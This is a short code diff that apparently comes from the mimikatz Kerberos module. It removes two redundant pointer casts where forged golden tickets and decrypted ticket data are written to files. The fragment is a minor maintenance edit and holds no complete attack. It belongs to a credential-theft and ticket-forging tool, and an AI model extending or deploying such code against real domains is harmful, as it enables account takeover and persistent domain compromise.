@@ -426,7 +426,7 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 										if(NT_SUCCESS(kuhl_m_kerberos_ptt_data(App_KrbCred, App_KrbCredSize)))
 											kprintf(L"\nGolden ticket for '%s @ %s' successfully submitted for current session\n", szUser, szDomain);
 									}
-									else if(kull_m_file_writeData(filename, (PBYTE) App_KrbCred, App_KrbCredSize))
+									else if(kull_m_file_writeData(filename, App_KrbCred, App_KrbCredSize))
 										kprintf(L"\nFinal Ticket Saved to file !\n");
 									else PRINT_ERROR_AUTO(L"\nkull_m_file_writeData");
 
@@ -705,7 +705,7 @@ NTSTATUS kuhl_m_kerberos_decode(int argc, wchar_t * argv[])
 					status = kuhl_m_kerberos_encrypt(keyType, KRB_KEY_USAGE_AS_REP_TGS_REP, key, keyLen, encData + offset, offset ? size : encSize, (LPVOID *) &decData, &decSize, FALSE);
 					if(NT_SUCCESS(status))
 					{
-						if(kull_m_file_writeData(szOut, (PBYTE) decData, decSize))
+						if(kull_m_file_writeData(szOut, decData, decSize))
 							kprintf(L"DEC data saved to file! (%s)\n", szOut);
 						else PRINT_ERROR_AUTO(L"\nkull_m_file_writeData");
 						LocalFree(decData);
